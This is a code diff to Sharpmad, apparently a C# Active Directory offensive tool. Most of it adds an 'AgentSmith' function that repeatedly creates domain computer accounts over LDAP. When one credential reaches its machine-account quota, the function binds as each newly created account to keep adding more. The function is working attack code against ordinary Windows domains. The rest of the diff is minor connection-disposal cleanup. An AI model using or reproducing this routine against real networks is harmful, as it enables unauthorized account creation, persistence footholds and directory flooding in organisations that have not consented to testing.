@@ -10,6 +10,7 @@ using System.Runtime.Serialization.Formatters.Binary;
 using System.IO;
 using System.Security.Principal;
 using System.Security.Cryptography;
+using System.Threading;
 
 namespace Sharpmad
 {
@@ -362,6 +363,7 @@ namespace Sharpmad
                 request.Attributes.Add(new DirectoryAttribute("servicePrincipalName", servicePrincipalName));
                 request.Attributes.Add(new DirectoryAttribute("unicodePwd", unicodePwd));
                 connection.SendRequest(request);
+                connection.Dispose();
 
                 if (random)
                 {
@@ -376,7 +378,7 @@ namespace Sharpmad
             catch (Exception ex)
             {
 
-                if(ex.Message.Contains("The object exists."))
+                if (ex.Message.Contains("The object exists."))
                 {
                     Console.WriteLine("[!] Machine account {0} already exists", machineAccount);
                 }
@@ -386,6 +388,7 @@ namespace Sharpmad
                 }
 
                 Console.WriteLine(ex.ToString());
+                connection.Dispose();
                 throw;
             }
 
@@ -480,6 +483,129 @@ namespace Sharpmad
             {
                 directoryEntry.Dispose();
             }
+
+        }
+
+        public static void AgentSmith(string container, string distinguishedName, string domain, string domainController, string machineAccount, string machinePassword, bool verbose, NetworkCredential credential)
+        {
+            int i = 0;
+            int j = 1;
+            int k = 1;
+            int success = 0;
+            int machineAccountQuota = 9;
+            string account = "";
+            bool switchAccount = false;
+            string machineAccountPrefix = machineAccount;
+            string distinguishedNameOld = distinguishedName;
+            string samAccountName;
+            domain = domain.ToLower();
+            byte[] unicodePwd;
+            unicodePwd = Encoding.Unicode.GetBytes(String.Concat('"', machinePassword, '"'));
+
+            while (i <= machineAccountQuota)
+            {
+                machineAccount = String.Concat(machineAccountPrefix, j);
+
+                try
+                {
+
+                    if (machineAccount.EndsWith("$"))
+                    {
+                        samAccountName = machineAccount;
+                        machineAccount = machineAccount.Substring(0, machineAccount.Length - 1);
+                    }
+                    else
+                    {
+                        samAccountName = String.Concat(machineAccount, "$");
+                    }
+
+                    string dnsHostname = String.Concat(machineAccount, ".", domain);
+                    string[] servicePrincipalName = { String.Concat("HOST/", dnsHostname), String.Concat("RestrictedKrbHost/", dnsHostname), String.Concat("HOST/", machineAccount), String.Concat("RestrictedKrbHost/", machineAccount) };            
+                    distinguishedName = GetMAQDistinguishedName(machineAccount, container, distinguishedNameOld, domain, verbose);
+                    LdapDirectoryIdentifier identifier = new LdapDirectoryIdentifier(domainController, 389);
+                    LdapConnection connection = new LdapConnection(identifier);
+
+                    if (!String.IsNullOrEmpty(credential.UserName))
+                    {
+                        connection = new LdapConnection(identifier, credential);
+                    }
+
+                    try
+                    {
+                        connection.SessionOptions.Sealing = true;
+                        connection.SessionOptions.Signing = true;
+                        connection.Bind();
+                        AddRequest request = new AddRequest();
+                        request.DistinguishedName = distinguishedName;
+                        request.Attributes.Add(new DirectoryAttribute("objectClass", "Computer"));
+                        request.Attributes.Add(new DirectoryAttribute("sAMAccountName", samAccountName));
+                        request.Attributes.Add(new DirectoryAttribute("userAccountControl", "4096"));
+                        request.Attributes.Add(new DirectoryAttribute("dNSHostName", dnsHostname));
+                        request.Attributes.Add(new DirectoryAttribute("servicePrincipalName", servicePrincipalName));
+                        request.Attributes.Add(new DirectoryAttribute("unicodePwd", unicodePwd));
+                        connection.SendRequest(request);
+                        Console.WriteLine("[+] Machine account {0} added", machineAccount);
+                        connection.Dispose();
+                    }
+                    catch (Exception ex)
+                    {
+
+                        if (ex.Message.Contains("The server cannot handle directory requests."))
+                        {
+                            Console.WriteLine("[-] Limit reached with {0}", account);
+                            switchAccount = true;
+                            j--;
+                        }
+                        else if (ex.Message.Contains("The supplied credential is invalid."))
+                        {
+
+                            if (j > success)
+                            {
+                                Console.WriteLine("[-] Machine account {0} was not added", account);
+                                Console.WriteLine("[-] No remaining machine accounts to try");
+                                Console.WriteLine("[+] Total machine accounts added = {0}", j - 1);
+                                Environment.Exit(1);
+                            }
+
+                            switchAccount = true;
+                            j--;
+                        }
+                        else
+                        {
+                            Console.WriteLine(ex.ToString());
+                            success = j;
+                        }
+
+                        connection.Dispose();
+                    }                    
+
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine(ex.Message);
+                }
+
+                if (i == 0)
+                {
+                    account = String.Concat(machineAccountPrefix, k, "$");
+                }
+
+                if (i == machineAccountQuota || switchAccount)
+                {
+                    Console.WriteLine("[*] Trying machine account {0}", account);
+                    credential = new NetworkCredential(account, machinePassword, domain);
+                    i = 0;
+                    k++;
+                    switchAccount = false;
+                }
+                else
+                {
+                    i++;
+                }
+
+                j++;
+                Thread.Sleep(5);
+            }      
 
         }
 
